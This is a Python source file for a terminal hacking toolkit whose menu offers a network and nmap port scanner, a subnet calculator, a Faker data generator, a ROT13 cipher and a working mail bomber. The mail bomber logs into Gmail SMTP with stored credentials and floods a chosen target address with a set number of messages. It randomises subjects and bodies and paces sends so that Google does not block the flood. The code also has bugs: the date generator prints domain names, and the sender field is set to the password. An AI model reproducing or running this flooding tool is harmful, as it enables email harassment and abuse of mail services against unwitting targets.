import nmap, datetime, getpass
import sys, time, decimal, re
import smtplib, os

from termcolor import colored
from zipfile import ZipFile
from clear_screen import clear
from faker import Faker
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from bug_logger import BugLogger
from ro_ciphergen_rot13 import CipherROT13
from ns_network_scanner import NetworkScanner

nmap_sc    = nmap.PortScanner()
curuser    = getpass.getuser()
bug_logger = BugLogger()
cipher_r13 = CipherROT13()
net_scan   = NetworkScanner()

## Bug Logger
def bug_logger_proc(menu):
    curdate = datetime.datetime.now()
    getdate = curdate.strftime('%d/%m/%Y')
    gettime = curdate.strftime('%I:%M:%S %p')
    error_info = str(sys.exc_info()[1])
    if error_info == '':
        error_info = 'action have been cancled manually by user (ctrl + c)'
    error_frm  = '[%s %s] (%s) ERROR: %s\n' % (getdate, gettime, menu, error_info)
    logs = open('bug-tracker.log', 'a')
    logs.write(error_frm)
    logs.close()

## Main Display
def header():
	clear()
	row, columns = os.popen('stty size', 'r').read().split()
	line_und  = ['_']*(int(columns))
	line_u    = ''.join(map(str, line_und))
	line_u    = colored(line_u, 'magenta', attrs=['bold'])
	line_hint = ['_']*(int(columns)-14)
	line_h    = ''.join(map(str, line_hint))

	#print(row+' x '+columns)

	curdate = datetime.datetime.now()
	getdate = curdate.strftime('%A, %d %B %Y')
	gettime = curdate.strftime('%I:%M:%S %p')
	print(colored(' _______ _______ _______ ___ ___  ___ _______', 'cyan', attrs=['bold']) , colored('__                __       ', 'yellow', attrs=['bold']))
	print(colored('|   _   |   _   |   _   |   Y   )|   |   _  ', 'cyan', attrs=['bold']) , colored('|  |--.---.-.-----|__.----.', 'yellow', attrs=['bold']))
	print(colored('|.  1___|.  |   |.  |   |.  1  / |.  |. ____', 'cyan', attrs=['bold']), colored('|  _  |  _  |__ --|  |  __|', 'yellow', attrs=['bold']))
	print(colored('|.  |___|.  |   |.  |   |.  _  \ |.  |. ____', 'cyan' , attrs=['bold']), colored('|_____|___._|_____|__|____|', 'yellow', attrs=['bold']))
	print(colored('|:  1   |:  1   |:  1   |:  |   \|:  |:  1   |' , 'cyan' , attrs=['bold']))
	print(colored('|::.. . |::.. . |::.. . |::.| .  |::.|::.. . |  ' , 'cyan' , attrs=['bold']) + colored(str(getdate).upper(), 'cyan', attrs=['bold']))
	print(colored("`-------`-------`-------`--- ---'`---`-------'  ", 'cyan' , attrs=['bold']) + colored(str(gettime).upper(), 'yellow', attrs=['bold']))
	print(line_u)
	#print(hint)
	print(line_u+'\n')

def clr(letter, color):
	if color == 'g':
		color = 'green'
	if color == 'c':
		color = 'cyan'
	if color == 'y':
		color = 'yellow'
	if color == 'm':
		color = 'magenta'
	if color == 'w':
		color = 'white'
	letter = colored(letter, color, attrs=['bold'])
	return letter

def m_clr(title, text):
	menu = clr('[','y')+clr(title,'c')+clr(']','y')+' '+text
	return menu

def menu_display():
	row, columns = os.popen('stty size', 'r').read().split()
	line_und = ['_']*(int(columns))
	line_u = ''.join(map(str, line_und))
	line_u    = colored(line_u, 'magenta', attrs=['bold'])

	print('|::    '+m_clr('NS','NETWORK SCANNER')+'  |  '+m_clr('PS','PORT SCANNER')+'  |  '+m_clr('SF','SUBNET FINDER')+'     |  '+m_clr('ZC','ZIP CRACKER')+'      ::|')
	print('|::    '+m_clr('DF','DATA-GEN FAKER')+'   |  '+m_clr('MB','MAIL BOMBER')+'   |  '+m_clr('RO','CIPHER-GEN ROT13')+'  |  '+m_clr('SB','SSH BRUTEFORCE')+'   ::|')
	print('|::    '+m_clr('RS','CIPHER-GEN RSA')+'   |  '+m_clr('WS','WEB SCRAPPER')+'  |  '+m_clr('XX','...')+'               |  '+m_clr('XX','...')+'              ::|')
	print('|::    '+clr('--------------------------------------------------------------------------------------------','m')+'   ::|')
	print('|::    '+clr('OPTION','c')+' : '+clr('[clear] // [menu] // [home] // [exit] // [help]','y')+'                                       ::|')
	print(line_u+'\n')

## User Input
def menu_display_input():
	rows, columns = os.popen('stty size', 'r').read().split()
	if (int(columns) >= 109) and (int(rows) >= 49):
		menu_input = input(colored('>> ', 'yellow', attrs=['bold']))
		return menu_input
	else:
		print("\n"+clr('Info:','y')+" please consider to resize your terminal screen into atleast ["+clr('49','c')+' x '+clr('109','c')+"] characters")
		print('      your current resosultion are [%s x %s] characters, which may cause some results' % (clr(rows,'c'), clr(columns,'c')))
		print('      not in a proper and desired format ...\n      Program exiting now :( \n')
		sys.exit(0)

def sw_case_menu(key):
	row, columns = os.popen('stty size', 'r').read().split()
	line_und  = ['_']*(int(columns))
	line_u    = ''.join(map(str, line_und))
	line_u    = colored(line_u, 'magenta', attrs=['bold'])
	checker = 'false'
	if key == 'clear':
		clear()
	elif key == 'home':
		clear()
		main_method()
	elif key == 'menu':
		print(line_u+'\n')
		menu_display()
	elif key == 'exit':
		sys.exit(0)
	elif key == 'NS':
		print(line_u+'\n')
		net_scan.network_scan_proc(net_scan.network_scan_input())
		print(line_u+'\n')
	elif key == '2':
		print(line_u+'\n')
		port_scan_proc(port_scan_input())
		print(line_u+'\n')
	elif key == '3':
		print(line_u+'\n')
		subnet_finder_proc()
		print(line_u+'\n')
	elif re.search('4', key):
		print(line_u+'\n')
		data_gen_proc(key)
		print(line_u+'\n')
	elif key == '5':
		print(line_u+'\n')
		mail_bomber_proc()
		print(line_u+'\n')
	elif key == 'RO':
		print(line_u+'\n')
		cipher_r13.cipher_gen_rot13_proc()
		print(line_u+'\n')

## Port Scanner
def port_scan_input():
	host = input('Target IP Address : ')
	print('Initiate port scanning for (%s) ...\n' % host)
	return host

def port_scan_proc(host):
	go_time = time.time()
	nmap_sc = nmap.PortScanner()
	try:
		nmap_sc.scan(host, arguments='-O -sV -T4')
		port_list = len(nmap_sc[host]['tcp'].keys())
		print('Host\t: %s (%s)' % (nmap_sc[host].hostname(), host))
		print('Machine\t: %s %s (%s)' % (nmap_sc[host]['osmatch'][0]['osclass'][0]['osfamily'], nmap_sc[host]['osmatch'][0]['osclass'][0]['osgen'],nmap_sc[host]['osmatch'][0]['osclass'][0]['vendor']))
		print('Kernel\t: %s' % (nmap_sc[host]['osmatch'][0]['osclass'][0]['cpe']))
		try:
			print('Ports\t: %s ports are open, %s not shown\n' % (port_list, str((1000-port_list))))
			print('   PORTS   STAT\t SERVICE\t  VERSION DETAIL')
			print('   -----   ----\t -------\t  --------------')
			for ports in nmap_sc[host]['tcp'].keys():
				fm_ports = '{:<6}'.format(ports)
				product_detail = '{:<14}'.format((str(nmap_sc[host]['tcp'][ports]['name']).upper() + ' ' + str(nmap_sc[host]['tcp'][ports]['version']))[:13])
				version_detail = '{:<6}'.format((nmap_sc[host]['tcp'][ports]['product'] + ' ' + nmap_sc[host]['tcp'][ports]['extrainfo'])) #[:38])
				state_detail   = '{:<3}'.format(str(nmap_sc[host]['tcp'][ports]['state']).upper()[:4])
				print('|- %s  %s\t %s | %s' % (fm_ports, state_detail, product_detail, version_detail))
			frmt_query = '{:.3f}'.format(time.time() - go_time)
			print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
		except:
			print('It seems that host doesn have any relevant services')
			frmt_query = '{:.3f}'.format(time.time() - go_time)
			print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
			bug_logger_proc('PS')
	except:
		print('Host requires atleast 1 open port for the scanning')
		print('Also make sure the IP Address is in the correct format\n')
		bug_logger_proc('PS')

## Network Scanner
def network_scan_input():
	network = input('Network Range and Prefix : ')
	print('Iniate network scanning for (%s) ...\n' % network)
	return network

def network_scan_proc(network):
	go_time = time.time()
	nmap_sc = nmap.PortScanner()
	try:
		nmap_sc.scan(network, arguments='-T5')
		net_prefix = re.split('; |, |\/', network)
		total_prefix = 32 - int(net_prefix[1])
		total_host = pow(2, total_prefix)
		print('Successfully collected %s active hosts out of %s \n' % (len(nmap_sc.all_hosts()), total_host))
		for host in nmap_sc.all_hosts():
			print('|- %s (%s)' % (host, nmap_sc[host].hostname()))
		frmt_query = '{:.3f}'.format(time.time() - go_time)
		print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
	except:
		print('Network Range requires the prefix to be included')
		print('Also make sure the Network Range are in the correct format')
		bug_logger_proc('NS')

## Subnet Finder
def subnet_finder_proc():
	try:
		netmask = [255,255,255,255]
		default = [0,0,0,0]
		ip      = input("IP Address / Prefix\t: ")
		host    = int(input("Total Required Hosts\t: "))
		go_time = time.time()
		##section 1
		calculated_prefix = 0
		power_user_prefix = 0
		calculated_class  = 'A'
		increment_prefix  = 2
		increment_square  = 0
		increment_square2 = 0
		increment_basic   = 0
		new_prefix        = 0
		next_inc_bit      = 0
		next_limit_bit    = 0
		arr_user_ip = re.split('; |, |\.|\/', ip)
		class_char  = ['A','B','C','D']
		class_range = [0,128,192,224]
		class_deter = int(arr_user_ip[0])
		thirdbit_deter = 0

		while host > 0:
			if host <= (increment_prefix - 2):
				break
			increment_prefix *= 2
			increment_square += 1
		increment_square += 1
		calculated_prefix = 32 - increment_square
		total_host        = pow(2, increment_square)
		power_user_prefix = pow(2, (32-int(arr_user_ip[4])))

		for a in range(len(class_char)):
			if class_deter < class_range[a]:
				break
			calculated_class = class_char[a]

		print('\nCIDR Prefix\t\t: /%s - %s host' % (calculated_prefix, total_host))
		print('Subnet Class\t\t: %s \n' % calculated_class)
		
		##section 2
		if (int(arr_user_ip[3]) / increment_prefix) < 1:
			arr_user_ip[3] = '0'
		else:
			thirdbit_deter = int(arr_user_ip[3]) / increment_prefix
			if thirdbit_deter > 1:
				while int(arr_user_ip[3]) > total_host:
					if int(arr_user_ip[3]) < increment_square2:
						break
					increment_square2 += total_host
				increment_square2 -= total_host
				arr_user_ip[3] = increment_square2

		na_ip_octet  = [0]*4
		fua_ip_octet = [0]*4
		lua_ip_octet = [0]*4
		ba_ip_octet  = [0]*4

		for i in range(len(na_ip_octet)):
			na_ip_octet[i]  = int(arr_user_ip[i])
			fua_ip_octet[i] = int(arr_user_ip[i])
			lua_ip_octet[i] = int(arr_user_ip[i])
			ba_ip_octet[i]  = int(arr_user_ip[i])

		fua_ip_octet[3] += 1
		lua_ip_octet[3]  = (na_ip_octet[3] + total_host) - 2
		ba_ip_octet[3]   = (na_ip_octet[3] + total_host) - 1

		if lua_ip_octet[3] > 254:
			increment_basic  = (lua_ip_octet[3]+2) - 256
			next_inc_bit     = int(increment_basic/256)
			lua_ip_octet[2] += next_inc_bit
			ba_ip_octet[2]  += next_inc_bit
			lua_ip_octet[3]  = 254
			ba_ip_octet[3]   = 255

		if lua_ip_octet[2] > 255:
			next_limit_bit  = 256 - int(total_host/256)
			na_ip_octet[2]  = next_limit_bit
			fua_ip_octet[2] = next_limit_bit
			lua_ip_octet[2] = 255
			ba_ip_octet[2]  = 255

		print('Network Address\t\t: %s.%s.%s.%s/%s' % (na_ip_octet[0],na_ip_octet[1],na_ip_octet[2],na_ip_octet[3],calculated_prefix))
		print('First Usable Address\t: %s.%s.%s.%s/%s' % (fua_ip_octet[0],fua_ip_octet[1],fua_ip_octet[2],fua_ip_octet[3],calculated_prefix))
		print('Last Usable Address\t: %s.%s.%s.%s/%s' % (lua_ip_octet[0],lua_ip_octet[1],lua_ip_octet[2],lua_ip_octet[3],calculated_prefix))
		print('Broadcast Address\t: %s.%s.%s.%s/%s' % (ba_ip_octet[0],ba_ip_octet[1],ba_ip_octet[2],ba_ip_octet[3],calculated_prefix))

		allocated_host = total_host - 2
		efficiency     = [int((host/allocated_host) * 100), (allocated_host-host)]
		poss_network   = int(power_user_prefix/total_host)

		print('\nAllocated Host\t\t: %s host out of %s available per subnet' % (host, allocated_host))
		print('Efficiency Meter\t: %s%% - %s wasted per subnet' % (efficiency[0], efficiency[1]))
		print('Possible Network\t: %s block space\n' % poss_network)

		template_subnetmask = [8,8,8,8]
		catch_subnetmask    = [0,0,0,0]
		new_subnetmask      = [0,0,0,0]
		new_subnetmask_bin  = [0,0,0,0]
		new_wildcard        = [255,255,255,255]
		new_wildcard_bin    = [0,0,0,0]
		catch_prefix        = calculated_prefix

		for i in range(len(template_subnetmask)):
			if catch_prefix >= template_subnetmask[i]:
				catch_subnetmask[i] = template_subnetmask[i]
				catch_prefix -= template_subnetmask[i]
			else:
				catch_subnetmask[i] = catch_prefix
				break

		for i in range(len(catch_subnetmask)):
			new_subnetmask[i]  = 256 - (pow(2, (8-catch_subnetmask[i])))
			new_wildcard[i]   -= new_subnetmask[i]
			new_subnetmask_bin[i] = '{:08b}'.format(new_subnetmask[i])
			new_wildcard_bin[i]   = '{:08b}'.format(new_wildcard[i])

		print('Subnet Mask\t\t: %s.%s.%s.%s' % (new_subnetmask[0],new_subnetmask[1],new_subnetmask[2],new_subnetmask[3]))
		print('8-bit notation\t\t: %s.%s' % (new_subnetmask_bin[0],new_subnetmask_bin[1]))
		print('\t\t\t  %s.%s' % (new_subnetmask_bin[2],new_subnetmask_bin[3]))
		print('Wildcard Mask\t\t: %s.%s.%s.%s' % (new_wildcard[0],new_wildcard[1],new_wildcard[2],new_wildcard[3]))
		print('8-bit notation\t\t: %s.%s' % (new_wildcard_bin[0],new_wildcard_bin[1]))
		print('\t\t\t  %s.%s' % (new_wildcard_bin[2],new_wildcard_bin[3]))
		frmt_query = '{:.3f}'.format(time.time() - go_time)
		print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
	except:
		print('\nIP Address requires the prefix to be included')
		print('Also make sure the IP Address and the Host are in the correct format')
		bug_logger_proc('SF')

## Data-Gen Faker
def data_gen_proc(param):
	try:
		arr_param = re.split('; |, |\ > ', param)
		if re.search('full-name', arr_param[1]):
			fake_name()
		elif re.search('email-address', arr_param[1]):
			fake_email()
		elif re.search('domain-name', arr_param[1]):
			fake_domain()
		elif re.search('full-date', arr_param[1]):
			fake_date()
		elif re.search('phone-number', arr_param[1]):
			fake_phone()
		elif re.search('street-address', arr_param[1]):
			fake_street()
		elif re.search('job-position', arr_param[1]):
			fake_job()
		else:
			print('Invalid argument: %s\n' % arr_param[1])
			print('| full-name | email-address | domain-name | full-date ')
			print('| phone_number | street-address | job_position |\n')
			print('Please input the available argument in the correct format')
			print('[menu_option] > [argument]')
	except:
			print('Invalid argument: %s\n' % param)
			print('| full-name | email-address | domain-name | full-date ')
			print('| phone_number | street-address | job_position |\n')
			print('Please input the available argument in the correct format')
			print('[menu_option] > [argument]')
			bug_logger_proc('DF')

def fake_name():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: full-name (30) ...\n')
	for i in range(10):
	        name_gen = '{:<21}'.format(fake_gen.name())
	        print('|- %s' % (name_gen), end =' ')
	        for i in range(1):
	                name_gen = '{:<21}'.format(fake_gen.name())
	                print('|- %s' % (name_gen), end =' ')
	                for i in range(1):
	                        name_gen = '{:<23}'.format(fake_gen.name())
	                        print('|- %s' % (name_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_email():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: email-address (20) ...\n')
	for i in range(10):
	        email_gen = '{:<34}'.format(fake_gen.email())
	        print('|- %s' % (email_gen), end =' ')
	        for i in range(1):
	                email_gen = '{:<26}'.format(fake_gen.email())
	                print('|- %s' % (email_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_domain():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: domain-address (30) ...\n')
	for i in range(10):
	        domain_gen = '{:<21}'.format(fake_gen.domain_name())
	        print('|- %s' % (domain_gen), end =' ')
	        for i in range(1):
	                domain_gen = '{:<21}'.format(fake_gen.domain_name())
	                print('|- %s' % (domain_gen), end =' ')
	                for i in range(1):
	                        domain_gen = '{:<21}'.format(fake_gen.domain_name())
	                        print('|- %s' % (domain_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_date():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: full-date (30) ...\n')
	for i in range(10):
	        domain_gen = '{:<21}'.format(fake_gen.domain_name())
	        print('|- %s' % (domain_gen), end =' ')
	        for i in range(1):
	                domain_gen = '{:<21}'.format(fake_gen.domain_name())
	                print('|- %s' % (domain_gen), end =' ')
	                for i in range(1):
	                        domain_gen = '{:<21}'.format(fake_gen.domain_name())
	                        print('|- %s' % (domain_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_phone():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: phone-number (30) ...\n')
	for i in range(10):
	        phone_gen = '{:<15}'.format(str(fake_gen.phone_number())[:14])
	        print('|- %s' % (phone_gen), end =' ')
	        for i in range(1):
	                phone_gen = '{:<15}'.format(str(fake_gen.phone_number())[:14])
	                print('|- %s' % (phone_gen), end =' ')
	                for i in range(1):
	                        phone_gen = '{:<15}'.format(fake_gen.phone_number())[:14]
	                        print('|- %s' % (phone_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_street():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: street-address (10) ...\n')
	for i in range(10):
	        add_gen = '{:<20}'.format(fake_gen.address())
	        arr_add = re.split('; |, |\n', add_gen)
	        print('|- '+arr_add[0]+', '+arr_add[1])

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

def fake_job():
	fake_gen = Faker()
	go_time  = time.time()
	print('Initializing Faker ...')
	print('Generating: job-position (10) ...\n')
	for i in range(10):
	        job_gen = '{:<30}'.format(fake_gen.job())
	        print('|- %s' % (job_gen))

	frmt_query = '{:.3f}'.format(time.time() - go_time)
	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))

## Mail Bomber
def mail_maker(gmail_addr, gmail_pass, target_addr, subject, body):
    try:
    	sender_addr   = gmail_pass
    	receiver_addr = target_addr
    	message = MIMEMultipart()
    	message['From'] = sender_addr
    	message['To']   = receiver_addr
    	message['Subject'] = subject
    	mail_content = body
    	message.attach(MIMEText(mail_content, 'plain'))
    	text = message.as_string()
    	return text
    except:
        print('Error have been occured due to the process of making the mail')
        print('Please confirm and verify the settings on setting.json')
        bug_logger_proc('MB')
def mail_bomber_proc():
	try:
		fake_text = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
		fin_input = False
		mail_content = ''
		texts = ''

		open_json = open(str(os.getcwd())+"/conf/gmail_account.json","r")
		str_json  = open_json.read()
		arr_json  = re.split('; |, |\\n', str_json)
		get_gmailaddr = re.split('; |, |\"', str(arr_json[0]))
		get_gmailpass = re.split('; |, |\"', str(arr_json[1]))

		sender_address   = get_gmailaddr[1]
		sender_pass      = get_gmailpass[1]
		receiver_address = input('Target E-Mail\t: ')

		mail_subject = input('Mail Subject\t: ')
		mail_content += input('Mail Content\t: ')
		mail_content += '\n'

		while fin_input == False:
			mail_content += input('\t\t  ')
			if re.search('///', mail_content):
				fin_input = True
				continue
			mail_content += '\n'

		session = smtplib.SMTP('smtp.gmail.com', 587)
		session.starttls()
		session.login(sender_address, sender_pass)

		total_mail   = int(input('Bomb Amount\t: '))
		sub_loop     = int(total_mail/55)
		interval     = total_mail/55
		counter      = 1
		#random_subj  = input('Do you want to radomize the subject (Y) ? ')
		#print(str(fake_subj.text())[:25])
		#print(random_subj)
		#frmt_query = '{:.3f}'.format(time.time() - go_time)

		est_time = '{:.4f}'.format(float(((total_mail * 2.3) + 5.5) / 3600))
		texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
		go_time = time.time()
		mail_delay = 0
		mail_passer_subj = mail_subject
		mail_passer_cont = mail_content
		print('\nEstimated processing time is around %s hours' % est_time)
		print('[+] Processing  | ', end="", flush=True)
		for i in range(54):
			if mail_delay >= 75:
				time.sleep(120)
				mail_delay = 0
			if sub_loop < 1:
				for j in range(1):
					if mail_passer_subj == '//random':
						mail_subject_2 = str(fake_text.text())[:25]
						mail_subject = mail_subject_2
						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
					if re.search('//random', mail_passer_cont):
						mail_content_2 = ''
						for i in range(30):
							mail_content_2 += fake_text.text()
						mail_content = mail_content_2
						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
					if counter <= total_mail:
						session.sendmail(sender_address, receiver_address, texts)
						#print('mail sent : %s' % (counter))
						counter += 1
						mail_delay += 1
						time.sleep(0.3)
			else:
				for j in range(sub_loop*2):
					if mail_passer_subj == '//random':
						mail_subject_2 = str(fake_text.text())[:25]
						mail_subject = mail_subject_2
						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
					if re.search('//random', mail_passer_cont):
						mail_content_2 = ''
						for i in range(30):
							mail_content_2 += fake_text.text()
						mail_content = mail_content_2
						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
					if counter <= total_mail:
						session.sendmail(sender_address, receiver_address, texts)
						#print('mail sent : %s' % (counter))
						counter += 1
						mail_delay += 1
						time.sleep(0.3)
			prog = ':'
			print(prog, end="", flush=True)
			time.sleep(0.1)

		print('\n[+] Finalizing  | ', end="", flush=True)
		for i in range(54):
			prog = ':'
			print(prog, end="", flush=True)
			time.sleep(0.06)
		print()
		session.quit()
		open_json.close()

		frmt_query = '{:.3f}'.format(time.time() - go_time)
		print('\n%s have been bombed successfully' % receiver_address)
		print("Take a break pause if the bomb have reach atleast 100 emails in one single attack")
		print('to avoid any refused or blocked connection from google smtp server')
		print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
	except:
		err_i = str(sys.exc_info()[1]) + ' ...)'
		print('\n\nIt seems the connection got refused from the service or by the user')
		print('Check out buglogger.log for more detail about this current event')
		bug_logger_proc('MB')

## Bug Logger
#def bug_logg_proc():


## Main Method
def main_method():
	checker = 'false'
	header()
	menu_display()
	while checker == 'false':
		key = menu_display_input()
		sw_case_menu(key)

while 1 > 0:
	rows, columns = os.popen('stty size', 'r').read().split()
	if (int(columns) >= 109) and (int(rows) >= 49):
		main_method()
	else:
		print("\n"+clr('Info:','y')+" please consider to resize your terminal screen into atleast ["+clr('49','c')+' x '+clr('109','c')+"] characters")
		print('      your current resosultion are [%s x %s] characters, which may cause some results' % (clr(rows,'c'), clr(columns,'c')))
		print('      not in a proper and desired format ...\n      Program exiting now :( \n')
		sys.exit(0)
